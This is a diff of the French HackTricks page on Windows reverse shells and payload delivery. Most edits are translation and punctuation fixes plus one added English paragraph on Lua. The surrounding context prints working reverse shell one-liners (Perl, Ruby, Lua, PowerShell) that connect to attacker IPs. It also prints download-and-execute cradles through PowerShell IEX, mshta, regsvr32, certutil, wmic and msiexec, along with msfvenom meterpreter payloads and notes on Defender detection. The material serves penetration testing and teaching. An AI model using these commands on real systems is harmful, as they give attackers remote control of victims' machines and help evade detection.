@@ -9,8 +9,8 @@ Autres façons de soutenir HackTricks :
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
@@ -51,6 +51,8 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
+
+Lua is a powerful, efficient, lightweight, embeddable scripting language. It is often used in the gaming industry for scripting game logic due to its speed and simplicity. Lua scripts can be executed within a Lua interpreter or embedded within other programs written in languages such as C or C++.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -78,14 +80,14 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Processus effectuant un appel réseau : **powershell.exe**\
-Charge utile écrite sur le disque : **NON** (_du moins nulle part que j'ai pu trouver en utilisant procmon !_)
+Charge utile écrite sur le disque : **NON** (_du moins nulle part où j'ai pu trouver en utilisant procmon !_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Processus effectuant un appel réseau: **svchost.exe**\
-Charge utile écrite sur le disque: **Cache local du client WebDAV**
+Processus effectuant un appel réseau : **svchost.exe**\
+Charge utile écrite sur le disque : **cache local du client WebDAV**
 
-**En une ligne:**
+**En une ligne :**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -95,18 +97,18 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
-Processus effectuant un appel réseau : **mshta.exe**\
-Charge utile écrite sur le disque : **Cache local d'IE**
+Processus effectuant un appel réseau: **mshta.exe**\
+Charge utile écrite sur le disque: **Cache local d'IE**
 ```bash
 mshta http://webserver/payload.hta
 ```
-Processus effectuant un appel réseau: **mshta.exe**\
-Charge utile écrite sur le disque: **Cache local d'IE**
+Processus effectuant un appel réseau : **mshta.exe**\
+Charge utile écrite sur le disque : **Cache local d'IE**
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
 Processus effectuant un appel réseau : **svchost.exe**\
-Charge utile écrite sur le disque : **cache local du client WebDAV**
+Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
 #### **Exemple de shell inversé hta-psh (utilise hta pour télécharger et exécuter la porte dérobée PS)**
 ```markup
@@ -220,7 +222,7 @@ Charge utile écrite sur le disque: **Cache local d'IE**
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 Processus effectuant un appel réseau : **svchost.exe**\
-Charge utile écrite sur le disque : **cache local du client WebDAV**
+Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
 **Détecté par le défenseur**
 
@@ -264,7 +266,7 @@ Téléchargez un B64exe, décodez-le et exécutez-le.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Détecté par Defender**
+**Détecté par le défenseur**
 
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
@@ -308,7 +310,7 @@ Attaquant
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Victime :
+Victime:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -321,7 +323,7 @@ wmic os get /format:"https://webserver/payload.xsl"
 Processus effectuant un appel réseau: **wmic.exe**\
 Charge utile écrite sur le disque: **Cache local d'IE**
 
-Fichier xsl d'exemple [à partir d'ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Fichier xsl d'exemple [ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -353,7 +355,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compiler le code C# sur la machine de la victime.
+Compiler du code C# sur la machine de la victime.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -366,7 +368,7 @@ Vous pouvez télécharger un shell inversé C# de base à partir d'ici: [https:/
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
 Processus effectuant un appel réseau: **svchost.exe**\
-Charge utile écrite sur le disque: **cache local du client WebDAV**
+Charge utile écrite sur le disque: **Cache local du client WebDAV**
 
 **Je ne l'ai pas essayé**
 
@@ -377,7 +379,7 @@ Charge utile écrite sur le disque: **cache local du client WebDAV**
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Processus effectuant un appel réseau : **svchost.exe**\
-Charge utile écrite sur le disque : **cache local du client WebDAV**
+Charge utile écrite sur le disque : **Cache local du client WebDAV**
 
 **Je ne l'ai pas essayé**
 
@@ -452,7 +454,7 @@ Lancez msfconsole avec la ressource créée :
 ```
 msfconsole -r unicorn.rc
 ```
-Commencez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez sur la victime:
+Commencez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -491,7 +493,7 @@ Autres façons de soutenir HackTricks:
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
